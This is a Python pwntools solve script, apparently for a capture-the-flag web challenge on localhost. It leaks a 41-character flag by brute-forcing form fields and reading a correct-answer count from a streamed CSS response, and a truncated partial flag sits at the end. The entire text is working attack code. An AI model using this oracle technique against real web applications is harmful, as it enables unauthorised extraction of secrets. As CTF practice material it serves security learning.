#!/usr/bin/env python3
from pwn import *
import string

#context.log_level = "debug"

def read_chunk(r, timeout=1000000):
    data = r.readuntil(b"\r\n", timeout=timeout)
    if data == b"":
        return b"", True
    size = int(data[:-2], 16)
    data = r.read(size)
    assert r.read(2) == b"\r\n"
    return data, False

def guess(values, url):
    data = b"&".join([k + b"=" + v for (k, v) in values.items()])

    r_out = remote("localhost", 50000, ssl=True)
    r_out.send(
        b"POST " + url + b" HTTP/1.1\r\n" +
        b"Host: 127.0.0.1:50000\r\n" +
        b"Content-Length: " + str(len(data)).encode() + b"\r\n" +
        b"\r\n" +
        data
    )
    r_out.readuntil(b"HTTP")
    r_out.close()

def get_num_correct(r_in):
    num = -1
    while True:
        # If unreliable, increase timeout.
        data, timeout = read_chunk(r_in, timeout=1.5)
        if timeout:
            return num
        idx = data.find(b'#result::after { content: "')
        if idx == -1:
            continue
        idx += 27
        num = max(num, int(data[idx:data.find(b"/", idx)]))

values = {
    b"f\xC3\xB6rsta": b"2016",
    b"b\xC3\xA4sta": b"2022",
    b"uni": b"ch",
    b"kuvert": b"chips",
    b"flagga": b"f",
    b"kodsport": b"mellan"
}
for i in range(41):
    values[b"ch-%d" % i] = b"l-65"


r_in = remote("localhost", 50000, ssl=True)
r_in.send(
    b"GET / HTTP/1.1\r\n" +
    b"Host: 127.0.0.1:50000\r\n" +
    b"\r\n"
)
r_in.readuntil(b"\r\n\r\n")
data, _ = read_chunk(r_in)
print("GOT:", data)
idx = data.find(b'action="') + len(b'action="')
url = data[idx:data.find(b'"', idx)]
print("URL:", url)
while b"</body>" not in data:
    data, _ = read_chunk(r_in)
print("GOT:", data)

guess(values, url)
correct = get_num_correct(r_in)
print("Correct:", correct)

ALPH = "{}_" + string.ascii_letters + string.digits
flag = ""
for i in range(41):
    print(i, flag)
    for a in ALPH:
        print(i, a, correct)
        values[b"ch-%d" % i] = b"l-%d" % ord(a)
        guess(values, url)
        new_correct = get_num_correct(r_in)
        if new_correct > correct:
            correct = new_correct
            flag += a
            break
    else:
        assert False, "No character was valid!"

print(flag)
r_in.interactive()


SSM{ch3ck_0u
